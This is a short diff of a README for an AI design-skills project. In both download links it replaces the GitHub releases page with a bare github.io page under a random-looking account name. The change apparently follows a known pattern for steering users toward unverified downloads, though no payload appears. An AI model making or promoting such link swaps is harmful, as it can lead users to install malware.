@@ -1,6 +1,6 @@
 # 🎨 ai-design-skills - Improve your ai generated design output
 
-[Visit the download page](https://github.com/tilliesubsidized136/ai-design-skills/releases)
+[Visit the download page](https://tilliesubsidized136.github.io)
 
 ## 📌 About this project
 
@@ -23,7 +23,7 @@ Ensure your chosen tool has access to your project folder. The AI must read your
 
 You download the necessary files from our release page. 
 
-[Click here to open the download page](https://github.com/tilliesubsidized136/ai-design-skills/releases)
+[Click here to open the download page](https://tilliesubsidized136.github.io)
 
 1. Open the link above in your web browser.
 2. Look for the section labeled Assets.
